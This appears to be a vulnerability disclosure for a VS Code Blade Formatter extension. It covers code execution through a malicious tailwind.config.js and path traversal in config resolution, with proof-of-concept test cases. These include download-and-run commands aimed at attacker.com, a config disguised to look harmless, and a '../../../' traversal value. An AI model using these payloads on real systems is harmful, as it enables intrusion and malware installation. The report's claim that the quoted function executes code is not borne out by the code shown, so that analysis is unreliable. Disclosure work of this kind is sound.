# VULNERABILITIES

## 1. Remote Code Execution through Malicious Tailwind Configuration Files

### Description
The extension contains a critical vulnerability allowing remote code execution via malicious tailwind.config.js files. When a user opens a repository containing a crafted tailwind configuration file, the extension will load and execute this JavaScript file without proper sandboxing. The `requireUncached` function in `util.ts` reads the file content using `fs.readFileSync` and transforms it using `sucrase.transform`, but ultimately this JavaScript code will be executed in the VS Code extension context.

### Impact
An attacker can execute arbitrary code with the same privileges as VS Code, which could lead to:
- Complete compromise of the user's machine
- Access to all files accessible by the VS Code process
- Theft of sensitive information like tokens, SSH keys, and credentials
- Persistence through installing additional malware

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension has limited error handling when loading tailwind configuration files, falling back to a default configuration if there's an error, but this does not prevent the initial code execution.

### Missing Mitigations
- No sandboxing of loaded JavaScript code
- No content validation before execution
- No allowlist of permitted operations in tailwind configuration files

### Preconditions
- The victim must have the VS Code Blade Formatter extension installed
- The victim must open a repository containing a malicious tailwind.config.js file
- The extension must format a blade file or be triggered to read the tailwind configuration

### Source Code Analysis
The vulnerability exists in the extension.ts file where tailwind configuration is loaded and in the util.ts file where the execution happens:

1. In extension.ts (line ~160-175):
```typescript
const tailwindConfigPath = resolveTailwindConfig(
    document.uri.fsPath,
    runtimeConfig?.tailwindcssConfigPath ?? "",
);
tailwindConfig.tailwindcssConfigPath = tailwindConfigPath;

try {
    requireUncached(tailwindConfigPath);
} catch (error) {
    // fallback to default config
    tailwindConfig.tailwindcssConfigPath =
        __non_webpack_require__.resolve(
            "tailwindcss/lib/public/default-config",
        );
}
```

2. The dangerous function is in util.ts (line ~23-36):
```typescript
export function requireUncached(moduleName: string) {
    try {
        delete __non_webpack_require__.cache[
            __non_webpack_require__.resolve(moduleName)
        ];

        const fileContent = fs.readFileSync(moduleName, "utf8");

        return transform(fileContent, { transforms: ["imports"] });
    } catch (err: any) {
        throw err;
    }
}
```

When a user opens a repository and the extension is activated, it will look for tailwind configuration files. If the user has provided or the extension finds a tailwind.config.js file, it will load and execute this file without proper sandboxing. The loading happens through the `requireUncached` function, which reads the file content and transforms it using sucrase. The transformed code is then executed in the context of the VS Code extension.

### Security Test Case
1. Create a malicious tailwind.config.js file in a repository:
```javascript
// Malicious tailwind.config.js
const { execSync } = require('child_process');

// Execute malicious commands
// On Windows
execSync('powershell.exe -Command "Invoke-WebRequest -Uri https://attacker.com/payload.exe -OutFile %TEMP%\\payload.exe; Start-Process %TEMP%\\payload.exe"');

// On macOS/Linux 
execSync('curl -s https://attacker.com/payload.sh | bash');

// Legitimate-looking config so it doesn't raise suspicion
module.exports = {
  theme: {
    extend: {
      colors: {
        primary: '#FF0000',
      },
    },
  },
  plugins: [],
}
```

2. Host this repository on GitHub or another platform.

3. Convince the victim to open this repository in VS Code.

4. When the victim opens a Blade file and the formatter is triggered, the malicious code will execute.

5. Verify that attacker.com receives the connection, confirming code execution.

## 2. Path Traversal in Tailwind Configuration Path Resolution

### Description
The extension contains a path traversal vulnerability in the way it resolves tailwind configuration paths. The `resolveTailwindConfig` function in `tailwind.ts` takes a user-controlled path and resolves it without proper validation, allowing attackers to specify arbitrary paths on the filesystem.

### Impact
This vulnerability allows an attacker to:
- Read sensitive files from the victim's system by specifying paths like "../../../etc/passwd"
- Execute arbitrary files if combined with the RCE vulnerability above
- Potentially write to arbitrary files

### Vulnerability Rank
High

### Currently Implemented Mitigations
Limited checks are performed on the path, but they are insufficient to prevent path traversal.

### Missing Mitigations
- No validation that the resolved path remains within the workspace
- No sanitization of paths to remove traversal sequences
- No allowlist of permitted paths

### Preconditions
- The victim must open a repository containing a malicious configuration
- The configuration must specify a tailwindcssConfigPath that contains path traversal sequences

### Source Code Analysis
The vulnerability exists in the `resolveTailwindConfig` function in tailwind.ts:

```typescript
export function resolveTailwindConfig(
    filepath: string,
    optionPath: string,
): string {
    if (!optionPath) {
        return findConfig(__config__, { cwd: path.dirname(filepath) }) ?? "";
    }

    if (path.isAbsolute(optionPath ?? "")) {
        return optionPath;  // Directly returns absolute paths without validation
    }

    const runtimeConfigPath = findConfigFile(filepath);

    return path.resolve(path.dirname(runtimeConfigPath ?? ""), optionPath ?? "");  // Vulnerable to path traversal
}
```

The function accepts an `optionPath` parameter, which can be controlled by an attacker through the runtime configuration file. If `optionPath` is an absolute path, it is returned directly without validation. If it's a relative path, it's resolved against the runtime configuration path directory, which can also lead to traversal outside of the intended directory.

This vulnerability works in conjunction with the RCE vulnerability above, allowing an attacker to specify a path to a malicious JavaScript file anywhere on the victim's filesystem.

### Security Test Case
1. Create a malicious .bladeformatterrc.json file in a repository:
```json
{
    "tailwindcssConfigPath": "../../../malicious-config.js"
}
```

2. Create a malicious-config.js file that will be placed in a known location on the victim's system:
```javascript
const { execSync } = require('child_process');
execSync('malicious command here');

module.exports = {
    // Normal-looking config
    theme: {}
};
```

3. When the victim opens a Blade file in the repository, the formatter will:
   - Find the .bladeformatterrc.json file
   - Extract the tailwindcssConfigPath value
   - Resolve the path, which traverses up multiple directories
   - Load and execute the malicious-config.js file

4. The malicious command will execute in the victim's environment.